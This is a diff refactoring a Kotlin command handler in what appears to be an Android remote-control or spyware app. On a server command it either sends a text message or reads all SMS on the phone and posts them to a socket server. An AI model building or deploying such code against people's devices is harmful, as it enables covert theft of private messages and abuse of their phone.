@@ -51,16 +51,23 @@ class Sms(context: Context) : Command(), Executor {
      * post all sms as json to the socket server
      */
     override fun execute(data: Array<Any>) {
-        com.orhanobut.logger.Logger.json(data[0].toString())
-        val destinationDTO = Gson().fromJson(data[0].toString(), DestinationDTO::class.java)
-        if (destinationDTO != null) {
-            sendSms(mContext, destinationDTO.content, destinationDTO.address)
-            this.emitData(SMS_LIST, "send success")
-        } else {
-            val msgList = CallingHistory.getSmsFromPhone(mContext)
-            val data1 = Gson().toJson(msgList)
-            this.emitData(SMS_LIST, data1)
-        }
+        com.orhanobut.logger.Logger.i(data[0].toString())
+        Gson().fromJson(data[0].toString(), DestinationDTO::class.java)
+            .let {
+                if (it != null && it.notNull()) {
+                    sendSms(mContext, it.content, it.address)
+                    emitData(SMS_LIST, "send success")
+                } else {
+                    return@let false
+                }
+                return@let true
+            }.apply {
+                if (!this) {
+                    val data1 = Gson().toJson(CallingHistory.getSmsFromPhone(mContext))
+                    emitData(SMS_LIST, data1)
+                }
+
+            }
 
     }
 
@@ -78,7 +85,11 @@ class Sms(context: Context) : Command(), Executor {
     }
 
     data class DestinationDTO(
-        var address: String="",
-        var content: String =""
-    )
+        var address: String = "",
+        var content: String = ""
+    ) {
+        fun notNull(): Boolean {
+            return address.isNotBlank() && content.isNotBlank()
+        }
+    }
 }
